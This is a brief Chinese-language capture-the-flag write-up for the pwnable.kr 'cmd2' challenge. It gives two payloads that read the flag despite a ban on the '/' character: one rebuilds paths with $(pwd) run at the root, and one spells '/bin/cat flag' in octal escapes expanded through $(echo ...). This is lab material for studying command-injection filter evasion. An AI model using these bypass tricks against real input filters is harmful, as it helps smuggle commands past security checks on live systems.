# pwnkr cmd2
1. 要繞過更多限制，這次不能用 /，所以有兩種方法
2. 第一種用 pwd，到根目錄構造出 /bin/cat /home/cmd2/f*，所以就是 /home/cmd2/cmd2 '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*
3. 第二種方法是透過 sh 會把八進制轉碼，所以構造出 ./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'，其中的八進制就是 /bin/cat flag 
